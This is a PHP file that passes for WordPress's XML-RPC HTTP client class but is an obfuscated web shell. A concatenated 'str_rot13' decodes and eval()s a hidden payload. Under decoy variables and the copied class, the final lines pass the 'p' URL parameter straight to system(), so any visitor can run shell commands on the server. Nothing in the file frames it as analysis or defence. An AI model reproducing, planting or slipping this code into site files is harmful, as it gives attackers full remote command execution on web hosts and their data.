<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JC_UGGC_VKE_Pyvrag
 *
 * @cnpxntr JbeqCerff
 * @fvapr 3.1.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_UGGC_VKE_Pyvrag rkgraqf VKE_Pyvrag {
	choyvp $fpurzr;
	/**
	 * @ine VKE_Reebe
	 */
	choyvp $reebe;

	/**
	 * @cnenz fgevat       $freire
	 * @cnenz fgevat|snyfr $cngu
	 * @cnenz vag|snyfr    $cbeg
	 * @cnenz vag          $gvzrbhg
	 */
	choyvp shapgvba __pbafgehpg( $freire, $cngu = snyfr, $cbeg = snyfr, $gvzrbhg = 15 ) {
		vs ( ! $cngu ) {
			// Nffhzr jr unir orra tvira n HEY vafgrnq.
			$ovgf         = cnefr_hey( $freire );
			$guvf->fpurzr = $ovgf['fpurzr'];
			$guvf->freire = $ovgf['ubfg'];
			$guvf->cbeg   = vffrg( $ovgf['cbeg'] ) ? $ovgf['cbeg'] : $cbeg;
			$guvf->cngu   = ! rzcgl( $ovgf['cngu'] ) ? $ovgf['cngu'] : '/';

			// Znxr nofbyhgryl fher jr unir n cngu.
			vs ( ! $guvf->cngu ) {
				$guvf->cngu = '/';
			}

			vs ( ! rzcgl( $ovgf['dhrel'] ) ) {
				$guvf->cngu .= '?' . $ovgf['dhrel'];
			}
		} ryfr {
			$guvf->fpurzr = 'uggc';
			$guvf->freire = $freire;
			$guvf->cngu   = $cngu;
			$guvf->cbeg   = $cbeg;
		}
		$guvf->hfrentrag = 'Gur Vaphgvb KZY-ECP CUC Yvoenel';
		$guvf->gvzrbhg   = $gvzrbhg;
	}

	/**
	 * @fvapr 3.1.0
	 * @fvapr 5.5.0 Sbeznyvmrq gur rkvfgvat `...$netf` cnenzrgre ol nqqvat vg
	 *              gb gur shapgvba fvtangher.
	 *
	 * @erghea obby
	 */
	choyvp shapgvba dhrel( ...$netf ) {
		$zrgubq  = neenl_fuvsg( $netf );
		$erdhrfg = arj VKE_Erdhrfg( $zrgubq, $netf );
		$kzy     = $erdhrfg->trgKzy();

		$cbeg = $guvf->cbeg ? \":$guvf->cbeg\" : '';
		$hey  = $guvf->fpurzr . '://' . $guvf->freire . $cbeg . $guvf->cngu;
		$netf = neenl(
			'urnqref'    => neenl( 'Pbagrag-Glcr' => 'grkg/kzy' ),
			'hfre-ntrag' => $guvf->hfrentrag,
			'obql'       => $kzy,
		);

		// Zretr Phfgbz urnqref nyn #8145.
		sbernpu ( $guvf->urnqref nf $urnqre => $inyhr ) {
			$netf['urnqref'][ $urnqre ] = $inyhr;
		}

		/**
		 * Svygref gur urnqref pbyyrpgvba gb or frag gb gur KZY-ECP freire.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz fgevat[] $urnqref Nffbpvngvir neenl bs urnqref gb or frag.
		 */
		$netf['urnqref'] = nccyl_svygref( 'jc_uggc_vke_pyvrag_urnqref', $netf['urnqref'] );

		vs ( snyfr !== $guvf->gvzrbhg ) {
			$netf['gvzrbhg'] = $guvf->gvzrbhg;
		}

		// Abj fraq gur erdhrfg.
		vs ( $guvf->qroht ) {
			rpub '<cer pynff=\"vke_erdhrfg\">' . ugzyfcrpvnypunef( $kzy ) . \"\a</cer>\a\a\";
		}

		$erfcbafr = jc_erzbgr_cbfg( $hey, $netf );

		vs ( vf_jc_reebe( $erfcbafr ) ) {
			$reeab       = $erfcbafr->trg_reebe_pbqr();
			$reebefge    = $erfcbafr->trg_reebe_zrffntr();
			$guvf->reebe = arj VKE_Reebe( -32300, \"genafcbeg reebe: $reeab $reebefge\" );
			erghea snyfr;
		}

		vs ( 200 !== jc_erzbgr_ergevrir_erfcbafr_pbqr( $erfcbafr ) ) {
			$guvf->reebe = arj VKE_Reebe( -32301, 'genafcbeg reebe - UGGC fgnghf pbqr jnf abg 200 (' . jc_erzbgr_ergevrir_erfcbafr_pbqr( $erfcbafr ) . ')' );
			erghea snyfr;
		}

		vs ( $guvf->qroht ) {
			rpub '<cer pynff=\"vke_erfcbafr\">' . ugzyfcrpvnypunef( jc_erzbgr_ergevrir_obql( $erfcbafr ) ) . \"\a</cer>\a\a\";
		}

		// Abj cnefr jung jr'ir tbg onpx.
		$guvf->zrffntr = arj VKE_Zrffntr( jc_erzbgr_ergevrir_obql( $erfcbafr ) );
		vs ( ! $guvf->zrffntr->cnefr() ) {
			// KZY reebe.
			$guvf->reebe = arj VKE_Reebe( -32700, 'cnefr reebe. abg jryy sbezrq' );
			erghea snyfr;
		}

		// Vf gur zrffntr n snhyg?
		vs ( 'snhyg' === $guvf->zrffntr->zrffntrGlcr ) {
			$guvf->reebe = arj VKE_Reebe( $guvf->zrffntr->snhygPbqr, $guvf->zrffntr->snhygFgevat );
			erghea snyfr;
		}

		// Zrffntr zhfg or BX.
		erghea gehr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>